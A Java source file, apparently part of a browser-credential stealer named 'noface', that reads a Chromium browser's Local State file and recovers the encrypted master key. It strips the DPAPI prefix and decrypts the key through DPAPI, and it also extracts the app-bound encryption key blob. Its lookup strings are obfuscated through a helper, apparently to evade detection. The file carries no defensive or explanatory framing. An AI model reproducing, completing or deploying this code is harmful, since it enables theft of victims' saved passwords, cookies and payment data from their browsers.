package noface.browsers;

import noface.config.S;

import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.Arrays;
import java.util.Base64;

public final class Key {

    private static byte[] dpapiTag() {
        return S.e("DPAPI").getBytes(StandardCharsets.US_ASCII);
    }

    public static byte[] master(Path localState) {
        if (localState == null || !Files.isRegularFile(localState)) return null;
        try {
            byte[] data = Copy.bytes(localState);
            if (data == null || data.length == 0) data = Files.readAllBytes(localState);
            String json = new String(data, StandardCharsets.UTF_8);
            String b64 = Json.field(json, S.e("encrypted_key"));
            if (b64 == null || b64.isEmpty()) return null;
            return dpapiKey(b64);
        } catch (Exception e) {
            return null;
        }
    }

    public static boolean hasAbe(Path localState) {
        byte[] blob = abeBlob(localState);
        return blob != null && blob.length > 4
                && blob[0] == 'A' && blob[1] == 'P' && blob[2] == 'P' && blob[3] == 'B';
    }

    public static byte[] abePayload(Path localState) {
        byte[] blob = abeBlob(localState);
        if (blob == null || blob.length <= 4) return null;
        if (blob[0] == 'A' && blob[1] == 'P' && blob[2] == 'P' && blob[3] == 'B') {
            return Arrays.copyOfRange(blob, 4, blob.length);
        }
        return blob;
    }

    private static byte[] abeBlob(Path localState) {
        if (localState == null || !Files.isRegularFile(localState)) return null;
        try {
            byte[] data = Copy.bytes(localState);
            if (data == null || data.length == 0) data = Files.readAllBytes(localState);
            String json = new String(data, StandardCharsets.UTF_8);
            String b64 = Json.field(json, S.e("app_bound_encrypted_key"));
            if (b64 == null || b64.isEmpty()) return null;
            return Base64.getDecoder().decode(b64);
        } catch (Exception e) {
            return null;
        }
    }

    public static byte[] dpapiKey(String base64Key) {
        byte[] raw;
        try {
            raw = Base64.getDecoder().decode(base64Key);
        } catch (IllegalArgumentException e) {
            return null;
        }
        byte[] tag = dpapiTag();
        if (raw.length <= tag.length || !starts(raw, tag)) return null;
        byte[] dpapiBlob = Arrays.copyOfRange(raw, tag.length, raw.length);
        byte[] mk = Dpapi.unprotect(dpapiBlob);
        if (mk == null || mk.length < 32) return null;
        return Arrays.copyOf(mk, 32);
    }

    private static boolean starts(byte[] data, byte[] prefix) {
        if (data.length < prefix.length) return false;
        for (int i = 0; i < prefix.length; i++) {
            if (data[i] != prefix[i]) return false;
        }
        return true;
    }

    private Key() {}
}
